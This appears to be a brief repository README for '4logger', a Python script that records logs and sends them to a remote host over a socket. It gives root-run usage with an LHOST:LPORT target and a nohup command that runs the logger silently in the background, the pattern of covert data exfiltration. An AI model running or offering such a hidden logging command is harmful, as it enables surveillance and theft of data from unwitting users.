# 4logger
This python script that will record all the log and send to system administrator (with socket module). Note: Run this script as root for working properly. Thanks

  	cd /path/to/file
	python3 4logger.py [LHOST]:[LPORT] -> python3 4logger.py 192.168.56.1:4444
  
if u wanna run it in silently and in background execute that by nohup

 	nohup python3 4logger.py 192.168.56.1:4444 > /dev/null 2>&1 &
